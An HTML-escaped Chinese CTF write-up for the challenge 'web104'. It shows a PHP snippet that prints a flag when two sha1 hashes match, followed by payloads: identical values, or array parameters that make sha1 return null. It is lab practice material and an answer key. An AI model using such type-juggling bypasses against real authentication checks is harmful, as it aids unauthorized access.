&lt;h1 id=&#34;web104-1&#34;&gt;&lt;a href=&#34;#web104-1&#34; class=&#34;headerlink&#34; title=&#34;web104&#34;&gt;&lt;/a&gt;web104&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:27:20

*/


highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);

if(isset($_POST[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]))&amp;#123;
    $v1 = $_POST[&amp;#39;v1&amp;#39;];
    $v2 = $_GET[&amp;#39;v2&amp;#39;];
    if(sha1($v1)==sha1($v2))&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;



?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;要求 &lt;code&gt;v1&lt;/code&gt; 和 &lt;code&gt;v2&lt;/code&gt; 经 &lt;code&gt;sha1&lt;/code&gt; 处理后相同，所以传入相同即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2=1

#POST
v1=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;或者可以传入数组&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2[]=

#POST
v1[]=
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807225904735.png&#34; alt=&#34;image-20250807225904735&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
